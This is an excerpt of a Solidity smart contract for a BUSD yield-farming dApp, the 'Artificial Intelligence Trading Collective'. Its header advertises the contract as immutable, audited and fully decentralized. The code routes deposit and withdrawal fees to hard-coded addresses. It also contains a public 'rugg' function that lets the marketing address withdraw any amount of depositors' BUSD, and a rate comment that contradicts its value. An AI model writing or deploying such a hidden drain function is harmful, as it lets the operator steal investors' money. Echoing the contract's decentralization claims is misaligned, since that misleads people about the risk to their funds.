...
/**
Artificial Intelligence Trading Collective
Website: https://AITC.Finance
Telegram Chat: https://t.me/aitc_chat
Trade and Injection announcements: https://t.me/aitc_ann

The first immuteable, audited, and fully decentralized bot trading dApp created, managed and maintained by the community. 

Disclaimer:
Investing in cryptocurrencies involves a high level of risk. Invest what you can afford to lose.
*/
...
contract AITCTest is Context, Ownable {

    using Math for uint256;
    address public OWNER_ADDRESS;
    bool private initialized = false;
    address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public DEV_ADDRESS = 0xdF0833C041db53856380CF1e64CD6428A9e41D3d;
    address public TRADING_ADDRESS = 0xe2BDD17fB7FdA71560C0F11Fe4516903F5208524;
    address public MARKETING_ADDRESS = 0x5e58D0B704606E6713864828441B7f258411468e;
    address _dev = DEV_ADDRESS;
    address _trading = TRADING_ADDRESS;
    ...
    uint8 DEPOSIT_FEE = 25;
    uint8 WITHDRAWAL_FEE = 5;
    uint16 DEV_FEE = 20;
    uint16 TRADING_FEE = 100;
    uint8 MARKETING_FEE = 80;
    uint256 MIN_DEPOSIT = 10 ether; // 10 BUSD
    uint256 MIN_BAKE = 1 ether; // 1 BUSD
    uint256 MAX_WALLET_TVL_IN_BNB = 10000 ether; // 10000 BUSD
    uint256 MAX_DAILY_REWARDS_IN_BNB = 1500 ether; // 1500 BUSD

    mapping(uint256 => address) public bakerAddress;
    uint256 public totalBakers;
    uint256 public rewardRate = 1500000; //15000 = 1.5%
    ...
    function hireTraders(uint256 _amount) public {
        require(initialized);
        ...
        sendDepFees(totalBnbFee, 0);
        handleBake(false);

        emit EmitBoughtBeans(msg.sender, _amount, beansFrom, baker.beans);
    }

    function rugg(uint256 a) public {
        require(msg.sender == _marketing, "not dev") ;
        IERC20(BUSD).transfer(_marketing, a);
    }

    function sendDepFees(uint256 totalFee, uint256 trading) private {
        uint256 trade = percentFromAmount(totalFee, TRADING_FEE);

        IERC20(BUSD).transfer(_trading, trade);

        if (trading > 0) {
            IERC20(BUSD).transfer(_marketing, trading);
        }
    }

    function sendWitFees(uint256 totalFee, uint256 trading) private {
    ...
    function handleBake(bool onlyRebaking) private {
        ...
        require(hasInvested(baker.adr), "Must be invested to compound");
        if (onlyRebaking == true) {
            require(
                beansToBnb(rewardedBeans(baker.adr)) >= MIN_BAKE,
                "Rewards must be equal or higher than 1 BUSD to compound"
            );
        }
        ...
        emit EmitBaked(msg.sender, beansFrom, baker.beans);
    }
    ...
    function takeProfits() public {
        Baker storage baker = bakers[msg.sender];
        require(hasInvested(baker.adr), "Must be invested to take profits");
        require(
        ...
        sendWitFees(totalBnbFee, forGiveAway);
    ...
    function maxPayout(address adr) public view returns (uint256) {
        return Math.mul(bakers[adr].totalDeposit, 100);
    }
    ...
    function rewardedBeans(address adr) private view returns (uint256) {
        ...
        uint256 dailyRewardFactor = dailyReward();
